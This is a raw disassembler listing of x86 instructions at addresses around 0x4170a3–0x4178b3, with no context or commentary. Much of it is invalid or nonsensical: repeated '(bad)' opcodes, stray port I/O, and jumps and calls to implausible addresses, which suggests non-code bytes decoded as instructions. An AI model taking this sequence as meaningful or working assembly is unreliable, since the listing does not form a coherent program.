  4170a3:	ins    BYTE PTR es:[edi],dx
  4170a4:	jmp    FWORD PTR [eax]
  4170a6:	push   ds
  4170a7:	cs ins DWORD PTR es:[edi],dx
  4170a9:	xor    ecx,DWORD PTR [esi+0x44b85326]
  4170af:	or     edx,DWORD PTR [eax]
  4170b1:	test   al,0xed
  4170b3:	adc    dl,bh
  4170b5:	add    bh,BYTE PTR [ecx]
  4170b7:	fs aaa 
  4170b9:	push   ebp
  4170ba:	sbb    eax,0x8f777a98
  4170bf:	xchg   ebx,eax
  4170c0:	pop    ds
  4170c1:	push   ebp
  4170c2:	icebp  
  4170c3:	xchg   ebp,eax
  4170c4:	lock je 0x4170a0
  4170c7:	shl    BYTE PTR [edi+0x15],1
  4170ca:	adc    eax,0xb8002f99
  4170cf:	xor    al,0xcb
  4170d1:	xor    eax,DWORD PTR [edi+esi*1]
  4170d4:	jb     0x41708b
  4170d6:	dec    ecx
  4170d7:	loope  0x4170d1
  4170d9:	in     eax,0x4c
  4170db:	(bad)  
  4170dc:	(bad)  
  4170dd:	jns    0x4170cc
  4170df:	and    al,0x1f
  4170e1:	dec    ebp
  4170e2:	loope  0x417071
  4170e4:	lods   eax,DWORD PTR ds:[esi]
  4170e5:	fcomp  QWORD PTR [ecx-0x29]
  4170e8:	(bad)  
  4170e9:	in     eax,0x68
  4170eb:	into   
  4170ec:	bound  ebx,QWORD PTR [eax+0x4d]
  4170ef:	std    
  4170f0:	inc    esp
  4170f1:	adc    al,0xa8
  4170f3:	inc    ebp
  4170f4:	add    esi,DWORD PTR [eax+ebp*4]
  4170f7:	cmp    eax,0x90410d00
  4170fc:	dec    esp
  4170fd:	add    eax,0xcd549055
  417102:	push   esi
  417103:	add    BYTE PTR [ebp+eax*8+0x22],0x3e
  417108:	push   ebx
  417109:	cmp    DWORD PTR [eax-0x39],ebp
  41710c:	call   0xfe1870c9
  417111:	jb     0x41712c
  417113:	sub    eax,0x82821638
  417118:	into   
  417119:	(bad)  
  41711a:	in     eax,dx
  41711b:	loope  0x4170be
  41711d:	js     0x4170eb
  41711f:	(bad)  
  417120:	cmp    DWORD PTR [esi+edx*2],ebp
  417123:	adc    ecx,DWORD PTR [ecx+0x391116a5]
  417129:	outs   dx,DWORD PTR ds:[esi]
  41712a:	push   ecx
  41712b:	or     eax,0x1017e900
  417130:	add    DWORD PTR [edi+0xd3d00],0x185d32e9
  41713a:	hlt    
  41713b:	xor    cl,BYTE PTR [eax+eax*1]
  41713e:	jmp    0x26c27d51
  417143:	xor    ebx,DWORD PTR [ebp+0x17]
  417146:	fdiv   QWORD PTR [edx]
  417148:	push   esp
  417149:	add    cl,ch
  41714b:	(bad)  
  41714c:	or     eax,DWORD PTR [ecx+0xb5d300e]
  417152:	sahf   
  417153:	add    al,BYTE PTR [edx-0x1787ee32]
  417159:	std    
  41715a:	test   BYTE PTR [ecx],0xd6
  41715d:	jmp    0x24a63b2b
  417162:	stc    
  417163:	aas    
  417164:	fdivr  st,st(5)
  417166:	jmp    0x312f39d
  41716b:	cld    
  41716c:	cmp    dl,BYTE PTR [ebx+0x62]
  41716f:	fsubr  st(0),st
  417171:	lds    eax,FWORD PTR [eax]
  417173:	push   es
  417174:	in     eax,dx
  417175:	sti    
  417176:	inc    ebp
  417177:	mov    edi,DWORD PTR [ebp+0x52f574fd]
  41717d:	ins    BYTE PTR es:[edi],dx
  41717e:	and    al,0xe8
  417180:	push   eax
  417181:	inc    esp
  417182:	and    al,0x3c
  417184:	dec    edx
  417185:	dec    eax
  417186:	mov    DWORD PTR [ecx+ebp*1],esi
  417189:	pop    eax
  41718a:	cmp    esp,DWORD PTR [eax-0x3f488024]
  417190:	in     al,dx
  417191:	sti    
  417192:	test   DWORD PTR [edi+0x9c81dc],esi
  417198:	enter  0xb,0x83
  41719c:	inc    edi
  41719d:	or     ecx,DWORD PTR [ebx]
  41719f:	xchg   BYTE PTR [ebx+0xc],bl
  4171a2:	add    BYTE PTR [eax],al
  4171a4:	inc    ebx
  4171a5:	and    BYTE PTR [eax+edx*1],ah
  4171a8:	jg     0x4171fa
  4171aa:	mov    edi,0x4d3c5f2b
  4171af:	mov    eax,DWORD PTR [esi-0x4c]
  4171b2:	sub    ebp,esi
  4171b4:	imul   esp
  4171b6:	xchg   DWORD PTR [esp+ebp*1+0x25],edx
  4171ba:	push   ebx
  4171bb:	push   edx
  4171bc:	adc    ebx,DWORD PTR [esi+0xaf0e887]
  4171c2:	in     eax,dx
  4171c3:	call   DWORD PTR [edi+0x21]
  4171c6:	sar    DWORD PTR [edi-0x33],0x50
  4171ca:	inc    esp
  4171cb:	and    al,0x80
  4171cd:	and    BYTE PTR [esi+0xb4c24],al
  4171d3:	jne    0x417236
  4171d5:	mov    BYTE PTR [esi+0xb4c28],bh
  4171db:	add    ah,cl
  4171dd:	add    edi,DWORD PTR [ecx]
  4171df:	add    BYTE PTR [ebp+0xb],cl
  4171e2:	add    BYTE PTR [ebp+ecx*2-0x72],bh
  4171e6:	sti    
  4171e7:	add    bl,ah
  4171e9:	and    BYTE PTR [ecx],bh
  4171eb:	add    BYTE PTR [ecx],dh
  4171ed:	cmp    eax,0xeda50004
  4171f2:	xchg   ch,bh
  4171f4:	xor    dl,BYTE PTR [esp+edi*8]
  4171f7:	push   esp
  4171f8:	sbb    DWORD PTR [ebx-0x2e],0x917800e8
  4171ff:	loope  0x4171fe
  417201:	sbb    bl,bh
  417203:	inc    eax
  417204:	pop    ecx
  417205:	pop    esi
  417206:	arpl   sp,cx
  417208:	std    
  417209:	push   edi
  41720a:	arpl   ax,cx
  41720c:	cmp    bl,dh
  41720e:	fadd   DWORD PTR [ecx]
  417210:	mov    DWORD PTR [ebp-0x34],edx
  417213:	icebp  
  417214:	mov    dl,dh
  417216:	mov    ebx,0x5b7c50ca
  41721b:	shr    al,cl
  41721d:	cs mov fs,ecx
  417220:	std    
  417221:	ins    BYTE PTR es:[edi],dx
  417222:	arpl   cx,si
  417224:	inc    DWORD PTR [ebp+0x3d]
  417227:	in     eax,dx
  417228:	adc    BYTE PTR [edx-0x43efda64],ch
  41722e:	stos   DWORD PTR es:[edi],eax
  41722f:	loop   0x417280
  417231:	add    ebp,DWORD PTR [ebx-0x2e]
  417234:	call   0xfe22b06f
  417239:	stos   BYTE PTR es:[edi],al
  41723a:	xchg   esp,eax
  41723b:	and    eax,0x1e1cc54
  417240:	add    BYTE PTR [ecx],dh
  417242:	fcmovnb st,st(2)
  417244:	jno    0x417296
  417246:	pop    ebp
  417247:	jge    0x417249
  417249:	xor    eax,esp
  41724b:	add    DWORD PTR [ecx+0x5d4b7],ecx
  417251:	xor    DWORD PTR [ebx-0x79076cf],edx
  417257:	out    0xeb,al
  417259:	push   esi
  41725a:	xlat   BYTE PTR ds:[ebx]
  41725b:	add    al,0xae
  41725d:	and    eax,0x1e4
  417262:	xor    al,BYTE PTR ds:0x8c3dd1d
  417268:	int3   
  417269:	xchg   BYTE PTR [eax-0x2a],ch
  41726c:	call   0xe74ebff2
  417271:	add    edi,DWORD PTR [edx+0x4658e041]
  417277:	sub    BYTE PTR [ebp-0xd],0x32
  41727b:	or     edi,esp
  41727d:	mov    WORD PTR [edi+0x3103eaf0],?
  417283:	dec    ecx
  417284:	pusha  
  417285:	xchg   ecx,eax
  417286:	sbb    eax,0xae03e70d
  41728b:	mov    ?,edi
  41728d:	pop    es
  41728e:	xor    DWORD PTR [ecx],ecx
  417290:	bound  ecx,QWORD PTR [ecx+0x3e70d49]
  417296:	stos   DWORD PTR es:[edi],eax
  417297:	clc    
  417298:	call   0x700c4a52
  41729d:	repz iret 
  41729f:	jae    0x417274
  4172a1:	pop    es
  4172a2:	xor    DWORD PTR [ecx],ecx
  4172a4:	hlt    
  4172a5:	cld    
  4172a6:	test   eax,0x3107f78e
  4172ab:	or     DWORD PTR [eax-0x77],esi
  4172ae:	dec    ecx
  4172af:	or     eax,0x7ff103e7
  4172b4:	pop    ebp
  4172b5:	push   DWORD PTR [edx]
  4172b7:	or     edi,esp
  4172b9:	mov    WORD PTR [edi+0x3103e2f8],gs
  4172bf:	sub    BYTE PTR [ebp-0x5],0x32
  4172c3:	or     edi,esp
  4172c5:	lea    eax,[eax]
  4172c7:	and    DWORD PTR [ebx],ecx
  4172c9:	cmp    ecx,esp
  4172cb:	jae    0x41724d
  4172cd:	test   DWORD PTR [edi+ecx*8],0x3103eaf4
  4172d4:	pop    esp
  4172d5:	lock mov ?,WORD PTR [edi+0x3103eaf8]
  4172dc:	and    BYTE PTR [ebp-0x5],0x32
  4172e0:	or     DWORD PTR [eax],eax
  4172e2:	jmp    0xcdd000d9
  4172e7:	or     DWORD PTR ss:[eax],eax
  4172ea:	jo     0x417297
  4172ec:	clc    
  4172ed:	add    ebp,ecx
  4172ef:	xor    al,BYTE PTR [edx+0x92ef186]
  4172f5:	add    BYTE PTR [ecx-0x26797dab],bh
  4172fb:	or     DWORD PTR cs:[eax],eax
  4172fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172ff:	xor    eax,0x31678909
  417304:	or     eax,0x8bade900
  417309:	sbb    ch,ch
  41730b:	xor    cl,BYTE PTR [ecx]
  41730d:	dec    DWORD PTR [esi-0x1b]
  417310:	or     BYTE PTR [eax],al
  417312:	jmp    0xca14332c
  417317:	lods   eax,DWORD PTR ds:[esi]
  417318:	dec    ebp
  417319:	and    al,0x25
  41731b:	scas   al,BYTE PTR es:[edi]
  41731c:	leave  
  41731d:	je     0x4172d7
  41731f:	mov    ebp,0xb4092445
  417324:	jnp    0x417336
  417326:	in     eax,0x32
  417328:	or     DWORD PTR [ecx],ebp
  41732a:	mov    ebp,0x4f390e00
  41732f:	jb     0x4172f4
  417331:	std    
  417332:	add    ebp,ecx
  417334:	xor    ah,BYTE PTR [edx]
  417336:	dec    esp
  417337:	add    eax,0x9e4f3765
  41733c:	xchg   ecx,eax
  41733d:	mov    ecx,0x87852581
  417342:	sar    BYTE PTR [esi+esi*1+0x3c2a8930],0x36
  41734a:	pop    esi
  41734b:	push   0x69
  41734d:	adc    edx,eax
  41734f:	add    DWORD PTR ds:0x2ef98682,esi
  417355:	or     DWORD PTR [eax],eax
  417357:	ret    0x2cf6
  41735a:	push   eax
  41735b:	add    BYTE PTR [ebp-0x24a1a4eb],cl
  417361:	sar    BYTE PTR [eax],0xc2
  417364:	pusha  
  417365:	or     BYTE PTR [eax+0x64800],bh
  41736b:	ret    
  41736c:	ret    
  41736d:	dec    ebx
  41736e:	and    al,0x4
  417370:	mov    ds:0x1be9bdc0,eax
  417375:	add    DWORD PTR [eax+ecx*1+0x48],0xffffffce
  41737a:	xchg   DWORD PTR [esp-0x7],eax
  41737e:	jl     0x41736c
  417380:	cmp    al,0x1
  417382:	add    BYTE PTR [eax],al
  417384:	xchg   ebp,eax
  417385:	enter  0x771,0x89
  417389:	int3   
  41738a:	sub    al,0x4
  41738c:	or     BYTE PTR [eax],cl
  41738e:	mov    edi,0x2c5c008b
  417393:	inc    esp
  417394:	add    al,0xd8
  417396:	pop    es
  417397:	xchg   DWORD PTR [esp+esi*8-0x37fffbb9],edx
  41739e:	push   ss
  41739f:	xchg   DWORD PTR [esp+esi*8-0x27fffbb9],ecx
  4173a6:	sbb    eax,0xf3f49487
  4173ab:	add    eax,DWORD PTR [eax]
  4173ad:	enter  0x5016,0x8b
  4173b1:	adc    al,0x2c
  4173b3:	inc    eax
  4173b4:	add    al,0x98
  4173b6:	pop    es
  4173b7:	push   edx
  4173b8:	push   eax
  4173b9:	std    
  4173ba:	inc    ebx
  4173bb:	and    al,0x18
  4173bd:	add    BYTE PTR [eax],bl
  4173bf:	icebp  
  4173c0:	dec    DWORD PTR [edi-0x79]
  4173c3:	les    ebp,FWORD PTR [esp+edx*4]
  4173c6:	pop    es
  4173c7:	add    bl,al
  4173c9:	sbb    al,0xc4
  4173cb:	int3   
  4173cc:	int3   
  4173cd:	cmp    al,0xc4
  4173cf:	int3   
  4173d0:	int3   
  4173d1:	sbb    al,0xc4
  4173d3:	int3   
  4173d4:	int3   
  4173d5:	xor    DWORD PTR [ebp-0x2a4f1c76],edx
  4173db:	rol    BYTE PTR [eax],cl
  4173dd:	xor    edx,esp
  4173df:	xor    al,0x56
  4173e1:	out    0x56,al
  4173e3:	or     BYTE PTR ss:[eax],al
  4173e6:	test   DWORD PTR [edi],0x578182b6
  4173ec:	aas    
  4173ed:	xor    DWORD PTR [ecx-0x2c],ebx
  4173f0:	mov    edi,0xb60ee029
  4173f5:	add    BYTE PTR ds:0xb2ef8cd0,ch
  4173fb:	rol    DWORD PTR ds:0xb5cde0d,0xf0
  417402:	test   BYTE PTR [ecx],ah
  417404:	add    al,0x83
  417406:	stc    
  417407:	jmp    0x417481
  417409:	iret   
  41740a:	cs pop edx
  41740c:	ret    
  41740d:	mov    BYTE PTR [ebp+0xd],ch
  417410:	int3   
  417411:	inc    ecx
  417412:	mov    dl,0xa7
  417414:	sbb    al,0x7c
  417416:	add    BYTE PTR [edx+0x5b266af],dh
  41741c:	adc    bh,bh
  41741e:	pop    ebp
  41741f:	(bad)  
  417420:	mov    eax,ss
  417422:	(bad)  
  417423:	test   al,0x8f
  417425:	dec    esp
  417426:	xor    DWORD PTR [edx-0x4b53fe16],edi
  41742c:	out    dx,eax
  41742d:	mov    bh,BYTE PTR [eax]
  41742f:	loope  0x4173b3
  417431:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417432:	in     al,dx
  417433:	rcr    dh,1
  417435:	std    
  417436:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417437:	loopne 0x4173bb
  417439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41743a:	lods   al,BYTE PTR ds:[esi]
  41743b:	rcr    dh,1
  41743d:	std    
  41743e:	xchg   esi,eax
  41743f:	loopne 0x417455
  417441:	fnstcw WORD PTR [esi]
  417443:	pop    edx
  417444:	sbb    BYTE PTR [eax-0x74fe5f01],0x45
  41744b:	mov    eax,0x915fe82
  417450:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417451:	or     DWORD PTR [ebx-0x46342bb3],edi
  417457:	dec    ebp
  417458:	hlt    
  417459:	jae    0x41745b
  41745b:	dec    eax
  41745c:	add    DWORD PTR [ecx+0x48],esp
  41745f:	and    ah,BYTE PTR [ebp+0x792a486f]
  417465:	stos   BYTE PTR es:[edi],al
  417466:	or     BYTE PTR [eax-0xb],0x72
  41746a:	mov    esp,0x3e6f578
  41746f:	xor    DWORD PTR [edx],eax
  417471:	popf   
  417472:	or     ecx,0xba04285a
  417478:	sbb    al,0xef
  41747a:	sbb    BYTE PTR [edi],0x11
  41747d:	dec    esp
  41747e:	or     ch,BYTE PTR [ebx-0x463403b4]
  417484:	dec    esp
  417485:	fdiv   QWORD PTR [ebx+0x18]
  417488:	add    DWORD PTR [ecx+0x47],esp
  41748b:	inc    edx
  41748c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41748d:	pop    edi
  41748e:	inc    edi
  41748f:	sbb    bh,BYTE PTR [ecx+0x2a]
  417492:	sub    eax,0x10
  417495:	sbb    edi,DWORD PTR [ebp-0x6a1951ea]
  41749b:	mov    al,0xa0
  41749d:	adc    eax,0x3893145
  4174a2:	or     DWORD PTR [ecx-0x47f20cf8],esp
  4174a8:	or     al,0x54
  4174aa:	add    eax,DWORD PTR [edi+0x48]
  4174ad:	out    0xc,eax
  4174af:	lods   eax,DWORD PTR ds:[esi]
  4174b0:	xor    edi,0xffffffde
  4174b3:	lods   al,BYTE PTR ds:[esi]
  4174b4:	shr    esi,1
  4174b6:	xchg   ebp,eax
  4174b7:	mov    al,0xc8
  4174b9:	fld    QWORD PTR [ecx+esi*1-0x77]
  4174bd:	retf   
  4174be:	or     BYTE PTR [eax],al
  4174c0:	ror    DWORD PTR [eax],0xbb
  4174c3:	or     eax,0x35c0cb8
  4174c8:	inc    DWORD PTR [edi+0x0]
  4174cb:	jmp    0xd9fd01fd
  4174d0:	push   edi
  4174d1:	sar    ebp,cl
  4174d3:	stos   BYTE PTR es:[edi],al
  4174d4:	mov    bl,0xcf
  4174d6:	sbb    BYTE PTR [ebp+0x13814670],bl
  4174dc:	bound  eax,QWORD PTR [esp+ecx*4]
  4174df:	shl    DWORD PTR [edi-0x2d],cl
  4174e2:	std    
  4174e3:	je     0x41749e
  4174e5:	clc    
  4174e6:	cld    
  4174e7:	(bad)  
  4174e8:	fs cmp al,ch
  4174eb:	loopne 0x41751f
  4174ed:	or     DWORD PTR [eax],eax
  4174ef:	mov    ?,esp
  4174f1:	das    
  4174f2:	xchg   ebp,edx
  4174f4:	outs   dx,BYTE PTR ds:[esi]
  4174f5:	retf   
  4174f6:	or     cl,ch
  4174f8:	pop    edi
  4174f9:	mov    bl,ah
  4174fb:	push   0xe9008a21
  417500:	xor    bh,BYTE PTR [edx]
  417502:	push   esi
  417503:	push   ds
  417504:	mov    eax,0x3e6c084c
  417509:	mov    DWORD PTR [edi+0x932d9],esi
  41750f:	pusha  
  417510:	lock mov al,al
  417513:	in     eax,dx
  417514:	mov    ecx,0x2d877f1a
  417519:	or     esp,edi
  41751b:	jmp    0x62485d13
  417520:	cmp    BYTE PTR [eax-0x1b],dl
  417523:	test   eax,0x93c00
  417528:	test   al,0xcc
  41752a:	add    eax,DWORD PTR [edi]
  41752c:	ja     0x4174d6
  41752e:	adc    DWORD PTR [edi-0x7a],edi
  417531:	sub    eax,0x73e9fc09
  417536:	fimul  WORD PTR [edx]
  417538:	lock test BYTE PTR [eax-0x75189fce],cl
  41753f:	ret    0xa9e5
  417542:	adc    DWORD PTR [edi+0x0],edi
  417545:	inc    esp
  417547:	or     eax,DWORD PTR [eax]
  417549:	cwde   
  41754a:	retf   
  41754b:	jmp    0x417553
  41754d:	xchg   ebx,eax
  41754e:	out    dx,al
  41754f:	test   BYTE PTR [esi],bh
  417551:	adc    edi,edx
  417553:	jl     0x41753b
  417555:	pop    eax
  417556:	mov    esp,0xe719ffff
  41755b:	or     al,0x8b
  41755d:	arpl   WORD PTR [ecx-0x15f6c021],cx
  417563:	adc    BYTE PTR [ecx],cl
  417565:	push   ss
  417566:	sbb    BYTE PTR [eax],0x81
  417569:	cmp    eax,DWORD PTR ds:0xcb4803f0
  41756f:	out    0x4,eax
  417571:	push   ecx
  417572:	mov    es,WORD PTR [ebp+0x7f99a132]
  417578:	ret    0x810c
  41757b:	xor    BYTE PTR [ebx+0x3306ecee],al
  417581:	xchg   ecx,eax
  417582:	stc    
  417583:	inc    esp
  417584:	sbb    eax,0x7
  417587:	or     ecx,0x89873d00
  41758d:	inc    ebp
  41758e:	mov    BYTE PTR [eax+ebp*8],bl
  417591:	daa    
  417592:	or     BYTE PTR [eax+eax*1],cl
  417595:	pop    edi
  417596:	jbe    0x4175aa
  417598:	test   esp,ebp
  41759a:	and    eax,0x530004cb
  41759f:	dec    eax
  4175a0:	and    al,0x4
  4175a2:	adc    BYTE PTR [esp+esi*2],0x41
  4175a6:	fadd   DWORD PTR [eax-0x773f76f6]
  4175ac:	ret    0x4b04
  4175af:	int3   
  4175b0:	add    al,0x81
  4175b2:	inc    edx
  4175b3:	xchg   esp,eax
  4175b4:	je     0x4175f7
  4175b6:	cwde   
  4175b7:	cmp    esi,ebp
  4175b9:	ret    0xb8c
  4175bc:	xchg   DWORD PTR [ecx+esi*1-0x2],eax
  4175c0:	pop    es
  4175c1:	mov    edx,0x42b5f9
  4175c6:	mov    edx,0xb20a8ad9
  4175cb:	and    DWORD PTR ds:0x82dd7381,eax
  4175d1:	cli    
  4175d2:	pop    ecx
  4175d3:	xchg   ebp,eax
  4175d4:	inc    edx
  4175d5:	add    bl,ah
  4175d7:	idiv   DWORD PTR [esi-0x756acefc]
  4175dd:	jecxz  0x4175e0
  4175df:	xchg   edx,eax
  4175e0:	xor    BYTE PTR [ecx+0x5b88e9ec],cl
  4175e6:	cmp    eax,0xe3f83655
  4175eb:	jno    0x4175d6
  4175ed:	sbb    eax,0x1e23100
  4175f2:	push   0x4255d9
  4175f7:	mov    esp,0x1950dc1d
  4175fc:	call   0x4387:0x13310004
  417603:	sbb    DWORD PTR [ecx],edx
  417605:	in     al,dx
  417606:	jo     0x417639
  417608:	loopne 0x41760b
  41760a:	pop    ecx
  41760b:	mov    eax,0x29c237bc
  417610:	loopne 0x417648
  417612:	mov    DWORD PTR [ebp+0x4],ebp
  417615:	or     al,0x89
  417617:	test   DWORD PTR [ebp+eax*1+0x920f087],edi
  41761e:	mov    dh,0x28
  417620:	mov    eax,ds:0xeaa818e3
  417625:	mov    WORD PTR [edi+0x78fd771],?
  41762b:	lock xor esp,0xe692b08
  417632:	xchg   eax,esi
  417634:	and    BYTE PTR [ecx],cl
  417636:	mov    dh,0x38
  417638:	or     DWORD PTR [eax],ebp
  41763a:	in     eax,0x39
  41763c:	add    dh,cl
  41763e:	mov    WORD PTR [ebx],gs
  417640:	cmp    BYTE PTR [eax],0x87
  417643:	jae    0x41764a
  417645:	pusha  
  417646:	(bad)  
  417647:	icebp  
  417648:	std    
  417649:	jl     0x41764a
  41764b:	das    
  41764c:	lock outs dx,DWORD PTR ds:[esi]
  41764e:	vpaddw xmm7,xmm1,XMMWORD PTR [ebp+ecx*1+0x0]
  417654:	mov    dh,0xe8
  417656:	iret   
  417657:	mov    WORD PTR [ebx],?
  417659:	sub    BYTE PTR [eax],0x44
  41765c:	xor    al,0x97
  41765e:	lock les edi,FWORD PTR [esi-0x7]
  417662:	loope  0x417671
  417664:	scas   al,BYTE PTR es:[edi]
  417665:	add    esp,DWORD PTR [eax-0x3b]
  417668:	icebp  
  417669:	std    
  41766a:	cmp    al,0xd
  41766c:	xchg   al,ch
  41766e:	out    dx,eax
  41766f:	push   cs
  417670:	sub    edi,esi
  417672:	cmp    al,0x4
  417674:	cs enter 0xe60,0x88
  417679:	retf   
  41767a:	out    dx,eax
  41767b:	add    eax,DWORD PTR [eax+0x29203382]
  417681:	and    BYTE PTR [ebx],0x20
  417684:	and    eax,0x19c4e982
  417689:	icebp  
  41768a:	outs   dx,BYTE PTR ds:[esi]
  41768b:	add    al,0x46
  41768d:	sub    cl,0xc4
  417690:	or     ecx,edi
  417692:	pop    esi
  417693:	add    al,0x36
  417695:	sub    cl,0xc4
  417698:	fld    DWORD PTR [eax]
  41769a:	outs   dx,DWORD PTR ds:[esi]
  41769b:	add    al,0x26
  41769d:	xor    BYTE PTR [edx+0x6ab8b644],0xc5
  4176a4:	sub    eax,0x308be782
  4176a9:	sub    cl,0xc4
  4176ac:	f2xm1  
  4176ae:	outs   dx,BYTE PTR ds:[esi]
  4176af:	add    al,0xfe
  4176b1:	add    DWORD PTR [eax],0x10e0edeb
  4176b7:	popa   
  4176b8:	add    BYTE PTR ds:0x6deb890e,dh
  4176be:	loopne 0x4176c8
  4176c0:	jno    0x4176f7
  4176c2:	push   cs
  4176c3:	mov    ebx,edi
  4176c5:	stos   BYTE PTR es:[edi],al
  4176c6:	mov    eax,0xcb4fe888
  4176cb:	or     cl,ch
  4176cd:	inc    ecx
  4176ce:	xchg   bl,ah
  4176d0:	push   0xffffff96
  4176d2:	cld    
  4176d3:	push   eax
  4176d4:	lahf   
  4176d5:	inc    ebx
  4176d6:	add    BYTE PTR [ebx-0x23],0xbf
  4176da:	cmp    DWORD PTR [eax],ecx
  4176dc:	jb     0x41773a
  4176de:	or     BYTE PTR [ebx-0xf],0xaf
  4176e2:	inc    ebp
  4176e3:	add    al,0x60
  4176e5:	lahf   
  4176e6:	(bad)  
  4176e7:	jmp    0x80019cd1
  4176ec:	or     bh,BYTE PTR [ebx]
  4176ee:	cld    
  4176ef:	or     al,0xee
  4176f1:	and    eax,0x6d1787b6
  4176f6:	out    0x4,al
  4176f8:	mov    eax,0xa8d68504
  4176fd:	sbb    edi,edx
  4176ff:	cs scas eax,DWORD PTR es:[edi]
  417701:	stos   BYTE PTR es:[edi],al
  417702:	fidivr DWORD PTR [edi-0x36]
  417705:	clc    
  417706:	into   
  417707:	add    cl,ch
  417709:	and    esi,DWORD PTR [edi+eax*4+0x10e3f2a7]
  417710:	clc    
  417711:	in     al,0x84
  417713:	into   
  417714:	test   al,0xb
  417716:	or     BYTE PTR [edi],ch
  417718:	xchg   edi,eax
  417719:	mov    edx,0x8a7fda
  41771e:	cmp    al,0x1a
  417720:	xor    edx,ebx
  417722:	inc    ebx
  417723:	scas   eax,DWORD PTR es:[edi]
  417724:	xchg   DWORD PTR [edi-0x27fd1c0e],esi
  41772a:	jecxz  0x4176b0
  41772c:	into   
  41772d:	add    BYTE PTR [ecx-0x59cef721],bl
  417733:	sub    bh,0x81
  417736:	stos   DWORD PTR es:[edi],eax
  417737:	mov    dl,0x0
  417739:	call   FWORD PTR [eax-0x11762609]
  41773f:	(bad)  
  417740:	out    0x8,al
  417742:	cmp    DWORD PTR [edi+0x7fc7585],edi
  417748:	test   BYTE PTR [ebx-0x10424b83],0x8f
  41774f:	test   ebx,esp
  417751:	add    DWORD PTR [ecx],eax
  417753:	mov    eax,0x9711f905
  417758:	sub    eax,0x7db5d1ce
  41775d:	jecxz  0x417761
  41775f:	fwait
  417760:	stos   BYTE PTR es:[edi],al
  417761:	stos   BYTE PTR es:[edi],al
  417762:	jns    0x4176f2
  417764:	sub    eax,0x11f8cdd9
  417769:	mov    DWORD PTR [edi],eax
  41776b:	enter  0x1feb,0xdb
  41776f:	jmp    0xff7c0071
  417774:	stc    
  417775:	mov    DWORD PTR [ebp+0x180008b0],0xd9ce8508
  41777f:	jmp    0xcf4200a0
  417784:	(bad)  
  417785:	jmp    0x41778b
  417787:	xchg   ecx,eax
  417788:	mov    ch,0x5
  41778a:	sti    
  41778b:	xchg   ecx,eax
  41778c:	retf   0xc07f
  41778f:	adc    al,0xf5
  417791:	sbb    eax,0xe6849e89
  417796:	aas    
  417797:	xchg   ebx,eax
  417798:	cld    
  417799:	mov    al,0xd8
  41779b:	sbb    al,0x48
  41779d:	add    BYTE PTR [ecx+0x6ebc6ef],cl
  4177a3:	dec    ecx
  4177a4:	jmp    0xe27278a5
  4177a9:	add    DWORD PTR [ecx],ecx
  4177ab:	xchg   BYTE PTR [ecx+0x59313f5b],bl
  4177b1:	mov    eax,0x82dbcebf
  4177b6:	in     eax,0xb5
  4177b8:	loope  0x4177bb
  4177ba:	add    BYTE PTR [edx],bh
  4177bc:	adc    edi,DWORD PTR [ecx-0x751e0f88]
  4177c2:	fnsave [eax+0x3a]
  4177c5:	out    dx,eax
  4177c6:	jle    0x417756
  4177c8:	xor    eax,0xe7310001
  4177cd:	nop
  4177ce:	fdivr  st,st(7)
  4177d0:	mov    al,ds:0x16048701
  4177d5:	mov    al,dh
  4177d7:	mov    dl,0x21
  4177d9:	std    
  4177da:	xchg   BYTE PTR [edx-0x32],bh
  4177dd:	test   DWORD PTR [esi+0x3ddf5e87],0xd88eb5aa
  4177e7:	add    ah,dl
  4177e9:	mov    al,ds:0xf5c40901
  4177ee:	mov    ebp,ebx
  4177f0:	jo     0x4177e4
  4177f2:	(bad)  
  4177f3:	jle    0x41784b
  4177f5:	int    0x2
  4177f7:	add    BYTE PTR [ecx],dh
  4177f9:	out    0x90,eax
  4177fb:	fsubr  DWORD PTR [edx+0x68701a1]
  417801:	mov    ds:0xc3b00ee5,al
  417806:	fadd   DWORD PTR [eax]
  417808:	xor    eax,esp
  41780a:	or     dh,BYTE PTR [ebp+0x4339e9]
  417810:	mov    eax,0x27edc3a3
  417815:	popa   
  417816:	(bad)  
  417818:	xor    eax,esp
  41781a:	add    DWORD PTR [ecx],ecx
  41781c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41781d:	js     0x41786c
  41781f:	aas    
  417820:	xor    DWORD PTR [ecx],ecx
  417822:	fcom   st(1)
  417824:	mov    dh,0xb3
  417826:	test   al,0xde
  417828:	xor    eax,0xdcc5be80
  41782d:	add    eax,0xce2ed360
  417832:	jo     0x4177f2
  417834:	mov    al,0xc9
  417836:	jecxz  0x41784a
  417838:	pop    ss
  417839:	adc    BYTE PTR [ebp+0x620a9783],0x10
  417840:	loop   0x4177f3
  417842:	jecxz  0x417888
  417844:	xor    DWORD PTR [eax+0x384c53e],eax
  41784a:	push   0x98d00df
  41784f:	out    0x3,eax
  417851:	cmp    BYTE PTR [edx+0x93e5a1f],dl
  417857:	jo     0x417810
  417859:	mov    dh,0xda
  41785b:	in     eax,0x84
  41785d:	push   esp
  41785e:	int    0xe7
  417860:	add    esi,DWORD PTR [ecx]
  417862:	(bad)  
  417863:	pop    ebp
  417864:	mov    esp,0x8ce747d9
  417869:	je     0x417833
  41786b:	push   es
  41786c:	out    dx,al
  41786d:	iret   
  41786e:	loope  0x41787b
  417870:	add    al,0x31
  417872:	or     edx,esi
  417874:	mov    ds,WORD PTR [ecx+0x53]
  417877:	test   al,0x3
  417879:	scas   al,BYTE PTR es:[edi]
  41787a:	push   esp
  41787b:	sti    
  41787c:	mov    edi,?
  41787e:	test   DWORD PTR [edi],esp
  417880:	add    BYTE PTR [esi-0x4809e54b],ch
  417886:	stos   BYTE PTR es:[edi],al
  417887:	push   0xffffffdd
  417889:	push   esp
  41788a:	jle    0x4178a7
  41788c:	xchg   ecx,eax
  41788d:	jmp    0x3845a0dd
  417892:	push   esp
  417893:	mov    ebx,0xcec7dc8c
  417898:	std    
  417899:	ja     0x41787d
  41789b:	add    BYTE PTR [ebp-0x1dfff6ce],dh
  4178a1:	mov    bh,0xb0
  4178a3:	jns    0x4178cd
  4178a5:	xor    eax,0xcfa8dd82
  4178aa:	cli    
  4178ab:	jle    0x41783b
  4178ad:	out    0x8,al
  4178af:	add    cl,ch
  4178b1:	add    BYTE PTR [ebx],bh
  4178b3:	xchg   esp,eax
